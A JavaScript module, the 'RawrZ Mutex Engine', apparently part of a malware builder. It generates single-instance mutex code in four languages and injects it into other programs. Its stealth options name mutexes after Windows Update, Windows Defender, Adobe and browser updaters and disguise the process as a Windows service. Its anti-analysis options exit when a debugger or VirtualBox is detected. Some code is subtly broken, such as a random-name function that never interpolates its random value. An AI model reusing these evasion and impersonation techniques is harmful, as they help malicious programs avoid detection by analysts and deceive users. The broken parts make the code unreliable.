/**
 * RawrZ Mutex Engine - Process synchronization and anti-analysis
 * Implements mutex functionality for preventing multiple instances and stealth operations
 */

const crypto = require('crypto');
const { logger } = require('../utils/logger');

class MutexEngine {
    // Performance monitoring
    static performance = {
        monitor: (fn) => {
            const start = process.hrtime.bigint();
            const result = fn();
            const end = process.hrtime.bigint();
            const duration = Number(end - start) / 1000000; // Convert to milliseconds
            if (duration > 100) { // Log slow operations
                logger.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
            }
            return result;
        }
    }
    constructor() {
        this.name = 'MutexEngine';
        this.version = '1.0.0';
        this.activeMutexes = new Map();
        this.mutexPatterns = new Map();
        this.stealthMutexes = new Map();
    }

    async initialize(config = {}) {
        this.config = config.mutex || {};
        await this.initializeMutexPatterns();
        logger.info('Mutex Engine initialized');
    }

    // Initialize mutex patterns for different scenarios
    async initializeMutexPatterns() {
        // Standard mutex patterns
        this.mutexPatterns.set('standard', [
            'Global\\RawrZBot',
            'Global\\RawrZStub',
            'Global\\RawrZEngine',
            'Local\\RawrZInstance'
        ]);

        // Stealth mutex patterns (disguised as legitimate software)
        this.mutexPatterns.set('stealth', [
            'Global\\MicrosoftWindowsUpdate',
            'Global\\AdobeAcrobatUpdater',
            'Global\\GoogleChromeUpdater',
            'Global\\MozillaFirefoxUpdater',
            'Global\\JavaAutoUpdater',
            'Global\\WindowsDefender',
            'Global\\SystemMaintenance'
        ]);

        // Random mutex patterns (generated dynamically)
        this.mutexPatterns.set('random', this.generateRandomMutexes(10));

        // Anti-analysis mutex patterns
        this.mutexPatterns.set('anti-analysis', [
            'Global\\AntiDebugMutex',
            'Global\\AntiVMMutex',
            'Global\\AntiSandboxMutex',
            'Global\\ProcessProtectionMutex'
        ]);
    }

    // Generate random mutex names
    generateRandomMutexes(count) {
        const mutexes = [];
        const prefixes = ['Global\\', 'Local\\', 'Session\\'];
        const suffixes = ['Service', 'Process', 'Thread', 'Instance', 'Manager', 'Controller'];
        
        for (let i = 0; i < count; i++) {
            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
            const randomId = crypto.randomBytes(4).toString('hex');
            mutexes.push(`${prefix}${suffix}randomId`);
        }
        
        return mutexes;
    }

    // Generate mutex code for different languages
    generateMutexCode(language, options = {}) {
        const pattern = options.pattern || 'standard';
        const mutexes = this.mutexPatterns.get(pattern) || this.mutexPatterns.get('standard');
        const selectedMutex = mutexes[Math.floor(Math.random() * mutexes.length)];

        switch (language.toLowerCase()) {
            case 'cpp':
                return this.generateCPPMutexCode(selectedMutex, options);
            case 'csharp':
                return this.generateCSharpMutexCode(selectedMutex, options);
            case 'python':
                return this.generatePythonMutexCode(selectedMutex, options);
            case 'javascript':
                return this.generateJavaScriptMutexCode(selectedMutex, options);
            default:
                return this.generateCPPMutexCode(selectedMutex, options);
        }
    }

    // C++ mutex implementation
    generateCPPMutexCode(mutexName, options) {
        const stealthMode = options.stealth || false;
        const antiAnalysis = options.antiAnalysis || false;
        
        return `
// Mutex implementation for process synchronization
#include <windows.h>
#include <iostream>

class MutexManager {
private:
    HANDLE hMutex;
    std::string mutexName;
    bool isOwner;

public:
    MutexManager(const std::string& name) : mutexName(name), isOwner(false) {
        hMutex = CreateMutexA(NULL, TRUE, name.c_str());
        if (hMutex == NULL) {
            std::cerr << "Failed to create mutex: " << GetLastError() << std::endl;
            return;
        }
        
        // Check if mutex already exists (another instance is running)
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            std::cout << "Another instance is already running. Exiting..." << std::endl;
            CloseHandle(hMutex);
            ExitProcess(0);
        }
        
        isOwner = true;
        std::cout << "Mutex acquired successfully: " << mutexName << std::endl;
    }
    
    ~MutexManager() {
        if (isOwner && hMutex) {
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
            std::cout << "Mutex released: " << mutexName << std::endl;
        }
    }
    
    bool isMutexOwner() const {
        return isOwner;
    }
    
    // Anti-analysis: Check for analysis tools
    bool checkForAnalysisTools() {
        ${antiAnalysis ? this.getAntiAnalysisMutexCode() : ''}
        return false;
    }
    
    // Stealth: Disguise as legitimate process
    void disguiseAsLegitimateProcess() {
        ${stealthMode ? this.getStealthMutexCode() : ''}
    }
};

// Global mutex instance
MutexManager* g_mutexManager = nullptr;

// Initialize mutex
bool initializeMutex() {
    g_mutexManager = new MutexManager("${mutexName}");
    return g_mutexManager->isMutexOwner();
}

// Cleanup mutex
void cleanupMutex() {
    if (g_mutexManager) {
        delete g_mutexManager;
        g_mutexManager = nullptr;
    }
}
`;
    }

    // C# mutex implementation
    generateCSharpMutexCode(mutexName, options) {
        return `
using System;
using System.Threading;
using System.Runtime.InteropServices;

public class MutexManager : IDisposable {
    private Mutex mutex;
    private string mutexName;
    private bool isOwner;
    
    public MutexManager(string name) {
        mutexName = name;
        bool createdNew;
        mutex = new Mutex(true, name, out createdNew);
        
        if (!createdNew) {
            Console.WriteLine("Another instance is already running. Exiting...");
            Environment.Exit(0);
        }
        
        isOwner = true;
        Console.WriteLine($"Mutex acquired successfully: {mutexName}");
    }
    
    public bool IsOwner => isOwner;
    
    public void Dispose() {
        if (isOwner && mutex != null) {
            mutex.ReleaseMutex();
            mutex.Dispose();
            Console.WriteLine($"Mutex released: {mutexName}");
        }
    }
}

// Global mutex instance
public static class GlobalMutex {
    private static MutexManager mutexManager;
    
    public static bool Initialize() {
        mutexManager = new MutexManager("${mutexName}");
        return mutexManager.IsOwner;
    }
    
    public static void Cleanup() {
        mutexManager?.Dispose();
    }
}
`;
    }

    // Python mutex implementation
    generatePythonMutexCode(mutexName, options) {
        return `
import threading
import sys
import os
import time

class MutexManager:
    def __init__(self, name):
        self.mutex_name = name
        self.mutex = threading.Lock()
        self.is_owner = False
        
        # Try to acquire mutex
        if self.mutex.acquire(blocking=False):
            self.is_owner = True
            print(f"Mutex acquired successfully: {self.mutex_name}")
        else:
            print("Another instance is already running. Exiting...")
            sys.exit(0)
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.is_owner:
            self.mutex.release()
            print(f"Mutex released: {self.mutex_name}")
    
    @property
    def is_mutex_owner(self):
        return self.is_owner

# Global mutex instance
mutex_manager = None

def initialize_mutex():
    global mutex_manager
    mutex_manager = MutexManager("${mutexName}")
    return mutex_manager.is_mutex_owner

def cleanup_mutex():
    global mutex_manager
    if mutex_manager:
        mutex_manager.__exit__(None, None, None)
        mutex_manager = None
`;
    }

    // JavaScript mutex implementation
    generateJavaScriptMutexCode(mutexName, options) {
        return `
// JavaScript mutex implementation using file-based locking
const fs = require('fs');
const path = require('path');
const os = require('os');

class MutexManager {
    constructor(name) {
        this.mutexName = name;
        this.lockFile = path.join(os.tmpdir(), \"\" + name + ".lock\");
        this.isOwner = false;
        this.pid = process.pid;
        
        this.acquire();
    }
    
    acquire() {
        try {
            // Check if lock file exists
            if (fs.existsSync(this.lockFile)) {
                const lockData = fs.readFileSync(this.lockFile, 'utf8');
                const lockPid = parseInt(lockData.trim());
                
                // Check if process is still running
                try {
                    process.kill(lockPid, 0); // Signal 0 just checks if process exists
                    console.log('Another instance is already running. Exiting...');
                    process.exit(0);
                } catch (e) {
                    // Process doesn't exist, remove stale lock file
                    fs.unlinkSync(this.lockFile);
                }
            }
            
            // Create lock file
            fs.writeFileSync(this.lockFile, this.pid.toString());
            this.isOwner = true;
            console.log(\"Mutex acquired successfully: \" + this.mutexName + "\");
            
            // Cleanup on exit
            process.on('exit', () => this.release());
            process.on('SIGINT', () => this.release());
            process.on('SIGTERM', () => this.release());
            
        } catch (error) {
            console.error('Failed to acquire mutex:', error);
            process.exit(1);
        }
    }
    
    release() {
        if (this.isOwner && fs.existsSync(this.lockFile)) {
            try {
                fs.unlinkSync(this.lockFile);
                console.log(\"Mutex released: \" + this.mutexName + "\");
            } catch (error) {
                console.error('Failed to release mutex:', error);
            }
        }
    }
    
    get isMutexOwner() {
        return this.isOwner;
    }
}

// Global mutex instance
let mutexManager = null;

function initializeMutex() {
    mutexManager = new MutexManager("${mutexName}");
    return mutexManager.isMutexOwner;
}

function cleanupMutex() {
    if (mutexManager) {
        mutexManager.release();
        mutexManager = null;
    }
}
`;
    }

    // Anti-analysis mutex code
    getAntiAnalysisMutexCode() {
        return `
        // Check for common analysis tools
        HWND hwnd = FindWindow("OLLYDBG", NULL);
        if (hwnd) {
            std::cout << "Debugger detected, exiting..." << std::endl;
            ExitProcess(0);
        }
        
        hwnd = FindWindow("WinDbg", NULL);
        if (hwnd) {
            std::cout << "WinDbg detected, exiting..." << std::endl;
            ExitProcess(0);
        }
        
        // Check for VM artifacts
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\\\CurrentControlSet\\\\Services\\\\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            std::cout << "VirtualBox detected, exiting..." << std::endl;
            ExitProcess(0);
        }
        `;
    }

    // Stealth mutex code
    getStealthMutexCode() {
        return `
        // Disguise as legitimate Windows process
        SetConsoleTitle(L"Windows Update Service");
        
        // Create legitimate process name
        char processName[] = "svchost.exe";
        // Note: In a real implementation, you would modify the process name
        `;
    }

    // Generate mutex options for UI
    getMutexOptions() {
        return {
            patterns: Array.from(this.mutexPatterns.keys()),
            languages: ['cpp', 'csharp', 'python', 'javascript'],
            features: {
                stealth: 'Disguise mutex as legitimate software',
                antiAnalysis: 'Add anti-analysis checks to mutex',
                random: 'Generate random mutex names',
                persistent: 'Make mutex persistent across sessions'
            }
        };
    }

    // Apply mutex to existing code
    async applyMutexToCode(code, language, options = {}) {
        const mutexCode = this.generateMutexCode(language, options);
        
        // Insert mutex initialization at the beginning
        const insertionPoint = this.findInsertionPoint(code, language);
        const modifiedCode = code.slice(0, insertionPoint) + 
                           mutexCode + '\n' + 
                           code.slice(insertionPoint);
        
        return modifiedCode;
    }

    // Find insertion point for mutex code
    findInsertionPoint(code, language) {
        switch (language.toLowerCase()) {
            case 'cpp':
                // Insert after includes and before main function
                const mainIndex = code.indexOf('int main()');
                return mainIndex > 0 ? mainIndex : 0;
            case 'csharp':
                // Insert after using statements
                const classIndex = code.indexOf('class ');
                return classIndex > 0 ? classIndex : 0;
            case 'python':
                // Insert after imports
                const defIndex = code.indexOf('def ');
                return defIndex > 0 ? defIndex : 0;
            case 'javascript':
                // Insert after requires
                const funcIndex = code.indexOf('function ');
                return funcIndex > 0 ? funcIndex : 0;
            default:
                return 0;
        }
    }

    // Panel Integration Methods
    async getPanelConfig() {
        return {
            name: this.name,
            version: this.version,
            description: this.description || 'RawrZ Engine',
            endpoints: this.getAvailableEndpoints(),
            settings: this.getSettings(),
            status: this.getStatus()
        };
    }
    
    getAvailableEndpoints() {
        return [
            { method: 'GET', path: '/api/' + this.name + '/status', description: 'Get engine status' },
            { method: 'POST', path: '/api/' + this.name + '/initialize', description: 'Initialize engine' },
            { method: 'POST', path: '/api/' + this.name + '/start', description: 'Start engine' },
            { method: 'POST', path: '/api/' + this.name + '/stop', description: 'Stop engine' }
        ];
    }
    
    getSettings() {
        return {
            enabled: this.enabled || true,
            autoStart: this.autoStart || false,
            config: this.config || {}
        };
    }
    
    // CLI Integration Methods
    async getCLICommands() {
        return [
            {
                command: this.name + ' status',
                description: 'Get engine status',
                action: async () => {
                    const status = this.getStatus();
                    
                    return status;
                }
            },
            {
                command: this.name + ' start',
                description: 'Start engine',
                action: async () => {
                    const result = await this.start();
                    
                    return result;
                }
            },
            {
                command: this.name + ' stop',
                description: 'Stop engine',
                action: async () => {
                    const result = await this.stop();
                    
                    return result;
                }
            },
            {
                command: this.name + ' config',
                description: 'Get engine configuration',
                action: async () => {
                    const config = this.getConfig();
                    
                    return config;
                }
            }
        ];
    }
    
    getConfig() {
        return {
            name: this.name,
            version: this.version,
            enabled: this.enabled || true,
            autoStart: this.autoStart || false,
            settings: this.settings || {}
        };
    }

}

// Create and export instance
const mutexEngine = new MutexEngine();

module.exports = mutexEngine;
